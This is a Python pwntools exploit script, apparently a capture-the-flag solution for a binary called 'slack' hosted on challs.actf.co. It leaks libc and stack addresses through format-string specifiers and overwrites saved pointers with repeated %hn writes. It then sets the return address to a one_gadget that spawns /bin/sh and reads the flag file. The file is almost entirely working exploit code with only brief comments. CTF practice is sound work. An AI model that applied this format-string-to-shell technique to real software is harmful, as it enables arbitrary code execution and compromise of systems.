from pwn import *

# Set up pwntools for the correct architecture
exe = "./slack"
elf = ELF(exe)
context.log_level = "debug"
context.binary = elf
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* main+402
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()



# r = start()
r = remote("challs.actf.co", 31500)

# Leak stack and libc
sl("%21$p-%25$p")
ru(b"You: ")
libc = int(re(14), 16) - 171408
re(1)
leak = int(re(14), 16) - 384

log.info(f"{hex(libc)}, {hex(leak)}")

#count variable: put it on stack
wri = hex(leak)[-4:] 
wri = int(wri, 16)
s(f"%{wri+3}c%25$hn")
sl(f"%{0xff}c%55$hn")
org = leak
ret = leak + 112

# make last 2 bytes something related to stack address
wri = hex(org + 104)[-4:]
wri = int(wri, 16)

s(f"%{wri}c%25$hn") # 57 is the rbp
#make rbp to a stack address
s(f"%{wri}c%55$hn")


# make last next 2 bytes something related to stack address
wri = hex(org + 104)[-4:]
wri = int(wri, 16)

s(f"%{wri+2}c%25$hn") # 57 is the rbp

#make rbp to a stack address
wri = hex(org)[-8:-4]
wri = int(wri, 16)

s(f"%{wri}c%55$hn")

wri = hex(org + 104)[-4:]
wri = int(wri, 16)

s(f"%{wri+4}c%25$hn") # 57 is the rbp

#make rbp to a stack address
wri = hex(org)[:-8]
wri = int(wri, 16)

s(f"%{wri}c%55$hn")

#make rbp-0x70 as 0

wri = hex(org-8)[-4:]
wri = int(wri, 16)

s(f"%{wri}c%25$hn")
sl(f"%55$n")
#make ret to one_gadget
wri = hex(org+112)[-4:]
wri = int(wri, 16)

s(f"%{wri}c%25$hn") # 57 is the return adddress

one_gadget = libc + 0xebcf1
wri = hex(one_gadget)[-4:]
wri = int(wri, 16)

s(f"%{wri}c%55$hn")

# 3rd from last byte to be corrected
wri = hex(org+112)[-4:]
wri = int(wri, 16)

s(f"%{wri+2}c%25$hn") # 57 is the return adddress

one_gadget = libc + 0xebcf1
wri = hex(one_gadget)[-8:-4]
wri = int(wri, 16)

s(f"%{wri}c%55$hn")
sl(b"\x00"*14)

wri = hex(org)[-4:] 
wri = int(wri, 16)
s(f"%{wri+3}c%25$hn")
sl(f"JOJO%55$hn")

sl("cat ./flag.txt")



r.interactive()
'''
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
'''